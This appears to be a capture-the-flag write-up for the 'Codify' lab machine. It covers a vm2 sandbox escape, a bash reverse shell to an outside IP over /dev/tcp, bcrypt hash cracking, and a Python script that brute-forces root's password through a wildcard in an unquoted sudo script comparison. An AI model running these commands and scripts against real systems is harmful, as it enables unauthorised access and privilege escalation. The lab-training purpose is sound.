# Codify

## Nmap

```bash
nmap -sC -sV -vv -p- -oN nmap/full $target
```

## Homepage

![Homepage](Screenshots/2024-02-25-11-18-13.png)

![About us](Screenshots/2024-02-25-11-42-17.png)

![Editor](Screenshots/2024-02-25-11-41-59.png)

About us mentions a library `Vm2`

[PoC](https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244) for `Sandbox Escape in vm2@3.9.16`

![id proof](Screenshots/2024-02-25-11-44-28.png)

As we now have an operational command execution let's get ourselves a shell.

```bash
bash -c "sh -i >& /dev/tcp/10.10.14.139/4544 0>&1
```

![svc shell](Screenshots/2024-02-25-11-46-47.png)

We'd like a stable shell first:

```bash
python3 -c "import pty;pty.spawn('/bin/bash')"
^Z
stty raw -echo && fg
export TERM=xterm
```

```bash
find / -type d -perm /u+rx 2>/dev/null | grep -v /sys | grep -v /dev | grep -v /usr | grep -v /etc | grep -v /srv | grep -v /proc | grep -v /var | grep -v /run | grep -v /boot
```

![opt](Screenshots/2024-02-25-11-56-59.png)

![bad coding practice](Screenshots/2024-02-25-13-01-33.png)

by not wrapping `$USER_PASS` we can insert wildcards `*`

![potential wildcard vuln](Screenshots/2024-02-25-11-58-38.png)

Although this is a nice find and we can provide wildcard in the prompt we still need a different user to launch the script, since we're prompted a user password.

![tickets.db](Screenshots/2024-02-25-13-00-52.png)

Strings reveals a hash

![strings](Screenshots/2024-02-25-13-02-33.png)

```bash
john hash -w=/usr/share/wordlists/rockyou.txt --format=bcrypt
```

```bash
ssh joshua@$target
```

![joshua](Screenshots/2024-02-25-13-08-59.png)

We can explore the db one line at a time just by providing joshua's password

```bash
mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "use mysql; select * from user;"
```

![show databases](Screenshots/2024-02-25-14-14-51.png)

```bash
mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "use mysql; Select * from user;"
```

![hashes](Screenshots/2024-02-25-14-16-33.png)

By doing only this we can find `mysql-sha1` hashes, unfortunately root's hash isn't crackable so we'll need to resort to bruteforcing anyway. 

![sudo -l](Screenshots/2024-02-25-13-09-21.png)

As the wildcard always returns True we can bruteforce the password by appending the end of the bruteforced passwd with `*`

```python
import string
import subprocess

all_chars = list(string.ascii_letters + string.digits)
passwd = ""
fail = False

while not fail:
        for char in all_chars:
                command = f"echo '{passwd}{char}*' | sudo /opt/scripts/mysql-backup.sh"
                out = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, text=True).stdout
                if "confirmed" in out:
                        passwd += char
                        print(f"\r{passwd}", end='')
                        break
        else:
                fail = True
                print()
```

![expl.py](Screenshots/2024-02-25-13-39-35.png)

```bash
su root
```

![root](Screenshots/2024-02-25-13-40-02.png)

![Pwn](Screenshots/2024-02-25-13-35-38.png)
